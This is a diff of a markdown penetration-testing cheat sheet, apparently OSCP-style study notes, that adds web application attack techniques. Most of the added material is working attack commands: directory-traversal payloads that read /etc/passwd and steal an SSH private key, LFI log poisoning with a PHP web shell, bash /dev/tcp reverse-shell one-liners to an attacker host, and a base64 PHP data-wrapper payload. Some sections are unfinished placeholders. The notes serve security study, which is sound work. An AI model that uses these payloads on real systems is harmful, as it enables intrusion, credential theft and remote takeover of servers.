@@ -1,5 +1,6 @@
 - [Capture the flag](#capture-the-flag)
 - [Penetration testing methodology](#penetration-testing-methodology)
+- [Web application attack](#web-application-attack)
 - [Encode/Decode](#encode-decode)
 - [Reverse shell](#reverse-shell)
 - [File transfer](#file-transfer)
@@ -139,8 +140,8 @@
      - Network segmentation and firewall rules
 
 # Web application attack  
-- Cross-site scripting
-  - Goal: steal cookies, CSRF admin request  
+- **Cross-site scripting**
+  - ⚠️ Goal: steal cookies, CSRF admin request  
   - Inspect: search boxes, comment fields, username/password, contact form, URL param, HTTP headers (referer, user-agent) 
   - Check how values rfected without proper sanitization
     ```
@@ -187,19 +188,51 @@
     http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=find%20/%20-name%20flag%202%3E/dev/null: find flag
     http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=cat%20/tmp/flag
     ```
-- Directory traversal
-  - Goal: access credentials by using relative paths
+- **Directory traversal**
+  - ⚠️ Goal: access credentials/store ssh private key by using relative paths
     `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
-    `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`  
+    `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
+  - Inspect: url?**page=**xxx
   - Connect SSH from stolen private key
     ```
     curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/<username>/.ssh/id_rsa -o dt_key
     chmod 400 dt_key
     ssh -i dt_key -p 2222 offsec@mountaindesserts.com
     ```
-- Local file inclusion (LFI)
+- **Local file inclusion (LFI)**
+  - ⚠️ Goal: load system files and RCE via log file 
+    `http://target.com/index.php?page=../../../../etc/passwd`
+  - Inspect: url?**page=**xxx
+  - Include the log file via LFI
+    1. Map env (server & log paths)
+       **Linux/Apache: /var/log/apache2/access.log or /var/log/httpd/access_log**
+       Windows (XAMPP/Apache): C:\xampp\apache\logs\access.log  
+    3. Test log inclusion in header (User-Agent)    
+       `<?php echo system($_GET['cmd']); ?>`
+       `http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id`  
+    5. start netcat listener from kali  
+       `nc -nvlp 4444`
+    6. URL encoding to bypass bad request error
+       `../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la`
+    7. Include reverse shell
+       `bash -i >& /dev/tcp/<kali>/4444 0>&1` #bash
+       `bash -c "bash -i >& /dev/tcp/<kali>/4444 0>&1"` #bourne shell (sh)
+       `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<kali>%2F4444%200%3E%261%22`  #encoding
+  - PHP wrappers
+    - encode the PHP snippet into base64
+      `kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64`  
+    - execute system command
+      `kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
+NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 - Remote file inclusion (RFI)
+  - ⚠️ Goal: load malicious PHP payload from kali  
+  - Inspect: url?**page=**xxx
+  - dd
+  - dd
 - File upload vulnerabilities
+  - ddd
+  - ddd
+  - ddd
 - Command injection
 - SQL injection attacks
   
